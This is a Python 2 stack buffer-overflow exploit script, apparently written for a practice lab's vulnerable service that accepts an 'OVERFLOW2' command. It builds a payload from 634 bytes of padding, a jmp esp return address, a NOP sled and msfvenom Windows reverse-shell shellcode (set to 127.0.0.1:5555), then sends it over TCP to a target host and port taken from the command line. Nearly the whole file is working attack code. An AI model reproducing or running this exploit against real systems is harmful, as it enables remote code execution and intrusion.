#!/usr/bin/env python2

import socket
import sys
import logging

offset=634

# address of jmp esp
jmp_esp="\x05\x12\x50\x62"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=127.0.0.1 LPORT=5555 -f python  -b '\x00\x23\x3c\x83\xba' -v shellcode
shellcode =  b""
shellcode += b"\xfc\xbb\xb1\xaf\xd3\xe0\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x4d\x47\x51\xe0\xad\x98\x36\x68"
shellcode += b"\x48\xa9\x76\x0e\x19\x9a\x46\x44\x4f\x17\x2c"
shellcode += b"\x08\x7b\xac\x40\x85\x8c\x05\xee\xf3\xa3\x96"
shellcode += b"\x43\xc7\xa2\x14\x9e\x14\x04\x24\x51\x69\x45"
shellcode += b"\x61\x8c\x80\x17\x3a\xda\x37\x87\x4f\x96\x8b"
shellcode += b"\x2c\x03\x36\x8c\xd1\xd4\x39\xbd\x44\x6e\x60"
shellcode += b"\x1d\x67\xa3\x18\x14\x7f\xa0\x25\xee\xf4\x12"
shellcode += b"\xd1\xf1\xdc\x6a\x1a\x5d\x21\x43\xe9\x9f\x66"
shellcode += b"\x64\x12\xea\x9e\x96\xaf\xed\x65\xe4\x6b\x7b"
shellcode += b"\x7d\x4e\xff\xdb\x59\x6e\x2c\xbd\x2a\x7c\x99"
shellcode += b"\xc9\x74\x61\x1c\x1d\x0f\x9d\x95\xa0\xdf\x17"
shellcode += b"\xed\x86\xfb\x7c\xb5\xa7\x5a\xd9\x18\xd7\xbc"
shellcode += b"\x82\xc5\x7d\xb7\x2f\x11\x0c\x9a\x27\xd6\x3d"
shellcode += b"\x24\xb8\x70\x35\x57\x8a\xdf\xed\xff\xa6\xa8"
shellcode += b"\x2b\xf8\xc9\x82\x8c\x96\x37\x2d\xed\xbf\xf3"
shellcode += b"\x79\xbd\xd7\xd2\x01\x56\x27\xda\xd7\xf9\x77"
shellcode += b"\x74\x88\xb9\x27\x34\x78\x52\x2d\xbb\xa7\x42"
shellcode += b"\x4e\x11\xc0\xe9\xb5\xf2\x90\xed\xb5\x03\x07"
shellcode += b"\xec\xb5\x16\x64\x79\x53\x72\x9a\x2c\xcc\xeb"
shellcode += b"\x03\x75\x86\x8a\xcc\xa3\xe3\x8d\x47\x40\x14"
shellcode += b"\x43\xa0\x2d\x06\x34\x40\x78\x74\x93\x5f\x56"
shellcode += b"\x10\x7f\xcd\x3d\xe0\xf6\xee\xe9\xb7\x5f\xc0"
shellcode += b"\xe3\x5d\x72\x7b\x5a\x43\x8f\x1d\xa5\xc7\x54"
shellcode += b"\xde\x28\xc6\x19\x5a\x0f\xd8\xe7\x63\x0b\x8c"
shellcode += b"\xb7\x35\xc5\x7a\x7e\xec\xa7\xd4\x28\x43\x6e"
shellcode += b"\xb0\xad\xaf\xb1\xc6\xb1\xe5\x47\x26\x03\x50"
shellcode += b"\x1e\x59\xac\x34\x96\x22\xd0\xa4\x59\xf9\x50"
shellcode += b"\xd4\x13\xa3\xf1\x7d\xfa\x36\x40\xe0\xfd\xed"
shellcode += b"\x87\x1d\x7e\x07\x78\xda\x9e\x62\x7d\xa6\x18"
shellcode += b"\x9f\x0f\xb7\xcc\x9f\xbc\xb8\xc4\x9f\x42\x47"
shellcode += b"\xe7"
# Now compose the payload

buf ="OVERFLOW2 "

# Otherwise fill the buffer with junk until reaching the overflow
buf+="A"*offset

buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)
    
print s.recv(1024)
s.send(buf)
print s.recv(1024)